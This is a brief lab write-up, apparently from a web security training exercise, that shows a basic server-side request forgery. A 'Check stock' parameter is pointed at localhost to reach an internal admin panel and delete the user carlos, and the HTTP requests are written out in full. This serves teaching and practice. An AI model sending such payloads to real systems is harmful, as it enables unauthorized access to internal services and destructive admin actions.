# Basic SSRF against the local server

The "Check stock" feature sends a POST request to /product/stock with the full URL of the endpoint the application uses to check the stock:

```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

A normal response contains the number of items in stock in the body:

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 3

767
```

The path of the admin interface can be found in the HTML. Calling it directly reveals an authenticated view of the admin panel, from which we see the endpoint to delete the user carlos is `/admin/delete?username=carlos`.

```http
POST /product/stock HTTP/1.1

stockApi=http://localhost/admin/delete?username=carlos
```
